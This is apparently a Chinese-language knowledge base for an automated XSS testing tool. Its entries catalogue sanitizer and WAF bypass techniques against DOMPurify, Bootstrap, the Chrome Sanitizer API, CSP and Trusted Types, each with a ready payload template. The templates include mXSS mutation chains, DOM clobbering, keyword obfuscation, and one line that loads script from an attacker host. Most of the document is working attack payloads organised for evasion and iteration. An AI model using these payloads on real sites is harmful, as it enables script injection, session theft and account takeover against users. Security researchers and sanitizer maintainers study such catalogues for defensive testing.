- **原理**：CSP 与 Trusted Types 不传播到经网络请求加载的 iframe（仅本地 scheme 继承策略），攻击者可在同源"友好 iframe"中运行脚本——该环境不完整执行策略——再自建 Trusted Types policy（createHTML/createScriptURL）生成恶意 URL 与脚本；浏览器拦截 DOM 直写时用多级 policy 嵌套绕过。MutantBedrog 恶意广告活动实证，Chrome 团队认定 spec 允许（非浏览器 bug）。
- **模板**：`<iframe src="/same-origin-endpoint?x=<script>createHTML&&createHTML('<img src=x onerror=alert(1)>')</script>">`
- **来源备注**：`<iframe src="/same-origin-endpoint?x=<script>createHTML&&createHTML('<img src=x onerror=alert(1)>')</script>">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:csp:trusted_types_template_split` — RETURN_DOM 模式下 template 内拆分模板表达式绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 以 RETURN_DOM/RETURN_DOM_FRAGMENT/IN_PLACE 输出时，SAFE_FOR_TEMPLATES 的模板表达式 `${...}` 可被拆分进 `<template>` 内容中多个自定义元素，NodeIterator 遍历时因拆分而不合并清洗；下游调用 normalize() 后表达式重新拼接还原，绕过模板净化。绕的是"DOM 遍历清洗后再字符串化即安全"的信任假设。GHSA-gvmj-g25r-r7wr。
- **模板**：`<template><foo-a>$</foo-a><foo-b>{alert(document.domain)}</foo-b></template>`
- **来源备注**：`<template><foo-a>$</foo-a><foo-b>{alert(document.domain)}</foo-b></template>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:decode:decode_depth_mismatch` — 解码次数与后端不一致导致语法错误放行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：语义引擎的解码次数与后端/浏览器不一致：`alert('%27')` 引擎多解一次变 `alert(''')` 语法错误；`%3Csvg/onload=alert(1)%25111%3E` 一次解码正确、二次解码语法错误。打解码还原链层数/次数盲区。
- **模板**：`alert('%27')`、`%3Csvg/onload=alert(1)%25111%3E`
- **来源备注**：`alert('%27')`、`%3Csvg/onload=alert(1)%25111%3E`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:dom:clobber_allowlist_hook` — setConfig 持久化钩子污染 ALLOWED_ATTR 允许列表

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 使用 setConfig() 持久化快路径时跳过 _parseConfig 及其克隆保护；若应用注册了修改 data.allowedAttributes 的 uponSanitizeAttribute 钩子，一次可信渲染即永久污染共享允许列表，之后所有不可信提交都保留 live on* 事件（如 src 损坏的 `<img onerror>` 无需交互即触发），即使 removeAllHooks() 也无法回滚。绕的是"钩子只影响单次调用"的假设与配置隔离。GHSA-cmwh-pvxp-8882。
- **模板**：注入一次：`<img src=x onerror=alert(1)>`（前提：应用钩子把 onerror 写入 allowedAttributes）
- **来源备注**：注入一次：`<img src=x onerror=alert(1)>`（前提：应用钩子把 onerror 写入 allowedAttributes）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:dom:clobber_sanitizer_dep` — DOM clobbering 禁用 sanitizer 依赖（document.implementation）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：通过注入 `<img name="implementation">` 覆盖 document.implementation 全局（DOM clobbering），使 Bootstrap 的 sanitizeHtml 在检测到"浏览器不支持 createHTMLDocument"时静默跳过清洗（fail-open），随后的 tooltip/popover 内容未经净化直接入 DOM。这是把 clobber 目标指向安全库自身依赖、使其"降级失败"的手法。CVE-2025-1647 实证。
- **模板**：`<img name="implementation"><img src=x onerror=alert(1)>`
- **来源备注**：`<img name="implementation"><img src=x onerror=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:cdata_bogus_comment` — CDATA 段在 HTML 命名空间的 bogus-comment 解析差异

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CDATA 段 `<![CDATA[ ... ]]>` 仅被 HTML 解析器在 SVG/MathML 命名空间识别；在 HTML 命名空间中它被当作以第一个 `>` 结尾的 bogus comment。负载 `<![CDATA[ ><img src onerror=alert(1)> ]]>` 中，XML/sanitizer 按 CDATA 看待内部内容而放行，浏览器按注释在第一个 `>` 处结束、把 `<img>` 当真实标签执行。绕的是不对 CDATA 内容做标签检查的清洗器/WAF。DOMPurify 通过 SHOW_CDATA_SECTION 过滤修复。
- **模板**：`<![CDATA[ ><img src=x onerror=alert(1)> ]]>`
- **来源备注**：`<![CDATA[ ><img src=x onerror=alert(1)> ]]>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:custom_element_ns_jump` — 自定义元素命名空间跃迁绕过父节点命名空间检查

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 开启 CUSTOM_ELEMENT_HANDLING 时允许自定义元素出现在任意命名空间。构造 `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a>...` 负载：首次解析 payload 深嵌于 foo-bar 的 `<p>`/`<li>` 下，第二次解析时紧随 `<p>`（也可用 dd/dt/li）的内容向上弹出到初始 foo-bar 同级，造成 HTML↔SVG↔MathML 命名空间跃迁；而父节点命名空间检查看的是首次解析的树，从而失守。Yaniv Nizry 基于 kinugawamasato 的发现写成 DOMPurify 3.2.1 非默认配置绕过。
- **模板**：`<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a</table></li></mi><a href="javascript:alert(1)">x</a></math>`
- **来源备注**：`<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a</table></li></mi><a href="javascript:alert(1)">x</a></math>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:dompurify_templates_comment` — SAFE_FOR_TEMPLATES 属性值内注释变异（CVE-2025-26791）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 启用 SAFE_FOR_TEMPLATES 时模板字面量正则校验过松：注入属性值的注释在首次解析中当纯文本放行，浏览器二次解析时重新解释为注释并终止标签，配合自定义元素与 `<math>` 上下文生成可执行的 `<img onerror>`。绕的是"把属性值内文本当普通文本、不递归清洗"的清洗逻辑。nsysean 报告，3.2.4 修复。
- **模板**：`<math><foo-test><mi><li><table><foo-test><li></li></foo-test><a><foo-b id=""><img src=x onerror=alert(1)>">hmm</foo-b></a></table></li></mi></foo-test></math>`
- **来源备注**：`<math><foo-test><mi><li><table><foo-test><li></li></foo-test><a><foo-b id=""><img src=x onerror=alert(1)>">hmm</foo-b></a></table></li></mi></foo-test></math>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:dsd_parse_api_differential` — setHTMLUnsafe 与 innerHTML 的 DSD 解析差异

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：innerHTML 赋值不把 `<template shadowrootmode>` 变成 shadow root（内容保持惰性），而 Element.setHTMLUnsafe()/ShadowRoot.setHTMLUnsafe() 与服务器端 HTML 解析会真实附加 shadow root 并移动内容——同一段"经清理验证为安全"的 HTML 换到 setHTMLUnsafe 或 SSR 注入即变可执行。绕的是"用 innerHTML 环境做清理验证、却把结果喂给 setHTMLUnsafe/SSR"的上下文错配。MDN 明确 setHTMLUnsafe 不做清洗且可含 DSD。
- **模板**：`<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>`
- **来源备注**：`<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:dsd_shadowroot_mode` — 声明式 Shadow DOM 的 shadowrootmode 绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<template shadowrootmode=open>` 使 HTML 解析器把模板内容移入真实 shadow root 并删除 template 元素；sanitizer/WAF 若不识别 shadowrootmode，会把整段当惰性 template 放行。shadow root 不是安全边界，移入内容中的脚本/事件处理器成为可执行 DOM。绕的是"不递归清理 template 内容 + 不剔除 shadowrootmode 属性"的检测。HtmlSanitizer CVE-2026-25543 实证。
- **模板**：`<template shadowrootmode="open"><img src=x onerror=alert(document.domain)></template>`、`<template shadowrootmode=open><slot onslotchange=alert(1)></template>`
- **来源备注**：`<template shadowrootmode="open"><img src=x onerror=alert(document.domain)></template>`、`<template shadowrootmode=open><slot onslotchange=alert(1)></template>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_attr_closer` — 属性内闭合标签（重上下文化）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：属性值里藏 `</xmp>`/`</noscript>` 等闭合序列；sink 若把消毒后串包进 xmp/script 等原始文本容器再重解析，闭合序列提前结束容器使后续标签激活（CVE-2026-65914 DOMPurify <3.3.2 同款）。
- **模板**：`<img src=x alt="</xmp><img src=x onerror=alert(1)>">`
- **来源备注**：`<img src=x alt="</xmp><img src=x onerror=alert(1)>">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_comment` — 注释内变异

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 补丁只查文本节点变异不查注释，注释内构造的闭合序列在重解析后生效。
- **模板**：`<!--<img src=x alt="--><img src=x onerror=alert(1)>">`
- **来源备注**：`<!--<img src=x alt="--><img src=x onerror=alert(1)>">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_flatten` — 嵌套展平（512 层限制）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：浏览器对 >512 层嵌套标签执行"展平"而不保留命名空间，重解析时 `<caption>`/`<style>` 内容被提升到 HTML 命名空间，payload 二次解析才变可执行（DOMPurify 3.1.0 绕过 @IcesFont 同款）。
- **模板**：`<style><a title="</svg></style><img src onerror=alert(1)>"></a></style>` + 深度嵌套包裹至 512+ 层`
- **来源备注**：`<style><a title="</svg></style><img src onerror=alert(1)>"></a></style>` + 深度嵌套包裹至 512+ 层`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_mathml` — mXSS MathML 命名空间混淆

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<math><mtext><table><mglyph><style>` 等在 HTML/MathML 命名空间间切换，浏览器重解析时 `<style>` 内容被当 HTML 解析，逃过 WAF 只查顶层标签的规则（DOMPurify ≤2.0.17 绕过同款）。
- **模板**：`<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>`、`<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`、`<math><mi xlink:href="javascript:alert(1)">XSS</mi>`
- **来源备注**：`<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>`、`<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`、`<math><mi xlink:href="javascript:alert(1)">XSS</mi>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_noscript` — mXSS noscript

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：浏览器重解析造成标签错位，payload 初始无害、渲染后变成可执行。HTML 规范明确"序列化再解析片段不保证还原原始树"。
- **模板**：`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
- **来源备注**：`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_svg` — mXSS svg foreignObject

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：SVG + foreignObject + iframe 组合重解析；SVG `<title>/<desc>` 也可把 HTML 表插入 SVG（命名空间集成点）。
- **模板**：`<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>`
- **来源备注**：`<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:mxss_template` — mXSS template

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：<template> 内容在浏览器重解析时激活，绕过只查顶层标签的清洗器。
- **模板**：`<template><script>alert(1)</script></template>`
- **来源备注**：`<template><script>alert(1)</script></template>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:stack_pop_elevator` — button/dd/dt/li/table 出栈式"电梯"变异绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：HTML 解析器中 button、dd、dt、li、table 等元素闭合时会从 open-element stack 向下弹出（pop）其间所有元素，且可跨命名空间作用。fuzz 发现两对 button（或 dd/dt/li/table）之间的任意标签会在二次解析时被整体弹出到新位置，结合 `<image>`→`<img>` 标签转换，可把本在安全位置的内容移到可执行上下文。绕过了基于"父节点命名空间检查"的 sanitizer 逻辑（DOMPurify ≤3.1.2），因为它只信任首次解析的父子关系。
- **模板**：`<form><button></button><math><mtext></math><button></button><image></image><img src=x onerror=alert(1)>`
- **来源备注**：`<form><button></button><math><mtext></math><button></button><image></image><img src=x onerror=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:triple_reparse_form_table` — 三重解析 form/table 重排变异（双次 sanitize 也可破）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：混合 `<form>`/`<table>` 重排与深度扁平化，把 mXSS 变异推迟到第三次解析才完成。由于 DOMPurify.sanitize() 内部会序列化再解析，连续两次 sanitize 只"消耗"前两轮变异，最终第三次解析（应用插入 innerHTML）才触发 XSS。专门绕过 double-sanitize 模式与"净化后不可再变"的假设，DOMPurify ≤3.1.2 受影响。
- **模板**：`<form><table><form><math><mtext></math></form></table><svg><a><desc><svg><image><a><desc><img src=x onerror=alert(1)>`
- **来源备注**：`<form><table><form><math><mtext></math></form></table><svg><a><desc><svg><image><a><desc><img src=x onerror=alert(1)>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:xml_attr_rawtext_gap` — SAFE_FOR_XML 原始文本元素校验缺口

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 在 SAFE_FOR_XML 及 XML 输出场景下对属性值内的 rawtext 闭合标签（`</noscript>`、`</xmp>`、`</noembed>`、`</noframes>`、`</iframe>`、`</textarea>`）缺失校验：清洗后的属性值若被插入 `<noscript>` 等 rawtext 元素内部，浏览器在该闭合标签处结束 rawtext 上下文，把后续内容当 HTML 解析。利用 `/noscript<img src=x onerror=alert(1)>` 这类属性值即可逃逸。CVE-2025-15599（textarea）与 CVE-2026-0540（五个 rawtext 元素）实证。
- **模板**：`<img src=x onerror=alert(1) title="/noscript<img src=x onerror=alert(1)>">`
- **来源备注**：`<img src=x onerror=alert(1) title="/noscript<img src=x onerror=alert(1)>">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:mutation:xml_pi_confusion` — XML 处理指令与 HTML bogus-comment 解析差异绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：DOMPurify 以 PARSER_MEDIA_TYPE='application/xhtml+xml' 解析时按 XML 规范把 `<? ... ?>` 视为 Processing Instruction（以 `?>` 结尾、内容不被当作标签）；但浏览器在 HTML 命名空间遇到 `<?` 时进入 bogus comment 状态，以第一个 `>` 为终止符。于是 PI 内夹带的 `<img>` 在 HTML 重解析时暴露并执行。绕的是按 XML 解析、按 HTML 输出的客户端 sanitizer 及把 PI 当无害内容的 WAF。Ry0taK 报告，DOMPurify 2.4.9/3.0.11 修复。
- **模板**：`<?xml-stylesheet ><img src=x onerror=alert(1)>?>`
- **来源备注**：`<?xml-stylesheet ><img src=x onerror=alert(1)>?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:atob_innerhtml` — 两阶段 data-attr 注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 `data-x` 存目标名、`data-y` 存 base64 载荷，事件处理器里 `this[this.dataset.x]=atob(this.dataset.y)` 解码写 innerHTML——首阶段不出现危险关键字。
- **模板**：`<div data-x="innerHTML" data-y="<base64>" onmouseover="this[this.dataset.x]=atob(this.dataset.y)">`
- **来源备注**：`<div data-x="innerHTML" data-y="<base64>" onmouseover="this[this.dataset.x]=atob(this.dataset.y)">`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:comment_slice` — 属性/关键字注释切片

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：属性名/函数名插入注释或换行（HTML 属性解析容忍）。
- **模板**：`<svg o/**/n/**/load="alert(1)">`、`<img src=x onload=`
- **来源备注**：`<svg o/**/n/**/load="alert(1)">`、`<img src=x onload=`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:fullwidth_nfkc` — 全角字符 NFKC 归一化

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：全角字符（如 `＄` U+FF04）经 NFKC 归一化回 ASCII；WAF 按原始字节匹配失手，后端做了 NFKC 归一化则还原（F5 BIG-IP `＄{7*7}` 案例）。
- **模板**：`q=＄{7*7}`
- **来源备注**：`q=＄{7*7}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:indirect_exec` — 间接执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`alert`/`eval`/括号被滤时，用 setTimeout/setInterval 字符串参数（隐式 eval）、location 赋值、onerror+throw、数组方法回调、Reflect API 间接触达执行。
- **模板**：`setTimeout('ale'+'rt(2)')`、`setInterval('ale'+'rt(10)')`、`setTimeout\`alert\x281\x29\`、`onerror=alert;throw 23`、`onerror=eval;throw'=alert\x2823\x29'`
- **来源备注**：`setTimeout('ale'+'rt(2)')`、`setInterval('ale'+'rt(10)')`、`setTimeout\`alert\x281\x29\`、`onerror=alert;throw 23`、`onerror=eval;throw'=alert\x2823\x29'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:js_func_obfuscation` — JS 函数混淆

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：绕 `alert`/`eval` 等关键字黑名单：括号属性访问、Function 构造、atob 解码、动态字符串。
- **模板**：`top["al"+"ert"](1)`、`Function('ale'+'rt(1)')()`、`[].constructor.constructor('alert(1)')()`、`eval(atob('YWxlcnQoMSk='))`、`onerror=alert`
- **来源备注**：`top["al"+"ert"](1)`、`Function('ale'+'rt(1)')()`、`[].constructor.constructor('alert(1)')()`、`eval(atob('YWxlcnQoMSk='))`、`onerror=alert`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:keyword_assemble` — 运行时拼关键字

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`alert` 字符串被滤时用多种运行时拼装避开字面量：字符串拼接、charCode、atob、进制转换、原型链。
- **模板**：`window['ale'+'rt'](1)`、`self[`al`+`ert`](1)`、`globalThis['ale'+'rt'](1)`、`window[String.fromCharCode(97,108,101,114,116)](1)`、`window[atob('YWxlcnQ=')](1)`
- **来源备注**：`window['ale'+'rt'](1)`、`self[`al`+`ert`](1)`、`globalThis['ale'+'rt'](1)`、`window[String.fromCharCode(97,108,101,114,116)](1)`、`window[atob('YWxlcnQ=')](1)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:regex_source` — 正则字面量 source

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：正则字面量 `.source` 返回模式文本，`/al/.source + /ert/.source` 运行时拼出 `alert`——payload 中不出现目标字符串。
- **模板**：`top[/al/.source+/ert/.source](1)`、`location=/javascript:/.source+location`
- **来源备注**：`top[/al/.source+/ert/.source](1)`、`location=/javascript:/.source+location`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:obfuscation:tagged_template` — 标签模板

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：反引号调用函数无需括号，`alert\`1\``；`setTimeout\`...\`` 隐式 eval；括号被滤时的首选。
- **模板**：`alert\`1\`、`setTimeout\`alert\x281\x29\`、`new Function\`return alert\`\`1\`、`alert?.()`
- **来源备注**：`alert\`1\`、`setTimeout\`alert\x281\x29\`、`new Function\`return alert\`\`1\`、`alert?.()`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:chromesanitizer_ns_split` — Chrome Sanitizer API 命名空间属性分裂（xlink:href:x）绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Chrome 内置 Sanitizer API 的 RemoveAttributeIfValueIsHref 只对属性值严格等于 href/xlink:href 才剥离（针对 SVG 动画元素），且按冒号分裂命名空间属性时取前两段。构造 `attributeName="xlink:href:x"` 使严格比较失配，浏览器仍按 xlink:href 语义处理前缀，配合 values="javascript:alert(1)" 实现 XSS。绕的是精确字符串匹配的属性剥离逻辑，属解析器差异层。Searchlight Cyber 发现并已修复。
- **模板**：`<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><animate href="#foo" attributeName="xlink:href:x" values="javascript:alert(1)"/></a></svg>`
- **来源备注**：`<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><animate href="#foo" attributeName="xlink:href:x" values="javascript:alert(1)"/></a></svg>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:chromesanitizer_url_fastpath` — Sanitizer API URL 快路径解析器差异绕过 javascript:

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Chrome Sanitizer API 把 `<a href>`/form action/formaction 等导航属性的 javascript: 协议检测从完整 KURL 解析改为 fast-path 纯协议解析器（ProtocolIsJavaScript），两者对畸形 URL 的判定不一致，形成可利用差异窗口，令 javascript: 载荷在导航属性中漏过清洗。说明即使内置安全 API，URL 解析算法变更即产生语义级绕过面（Searchlight Cyber 在修复提交中确认）。
- **模板**：`<a href="java\tscript:alert(1)">x</a>`
- **来源备注**：`<a href="java\tscript:alert(1)">x</a>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:detection_rotation` — 检测轮换阶梯

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`alert(1)` 被 ~70% WAF 拦；从"弹窗"逐级轮换到"OOB 外带"，证明执行而不依赖 alert。成功判定不绑定 alert——这是"成功样本迭代"的判定基础。
- **模板**：`alert(1)`、`prompt(1)`、`confirm(1)`、`print()`、`confirm(document.domain)`
- **来源备注**：`alert(1)`、`prompt(1)`、`confirm(1)`、`print()`、`confirm(document.domain)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

### `xss:semantic:dom_clobber` — DOM clobbering

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`<img name>`/`<form id>`/`<embed name>` 元素通过 id/name 生成全局引用，覆盖 `document.currentScript`/`window.x` 等属性，把无脚本 HTML 变成脚本加载 gadget（Webpack CVE-2024-43788、Vite CVE-2024-45812 同款）。
- **模板**：`<img name="currentScript" src="https://attacker/evil.js">`（clobber document.currentScript）`、`<form id=isDevelopment></form>`、`<img name=x src=1>` + 代码把 `window.x` 当脚本 URL 使用`
- **来源备注**：`<img name="currentScript" src="https://attacker/evil.js">`（clobber document.currentScript）`、`<form id=isDevelopment></form>`、`<img name=x src=1>` + 代码把 `window.x` 当脚本 URL 使用`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.988540+00:00；retired=-

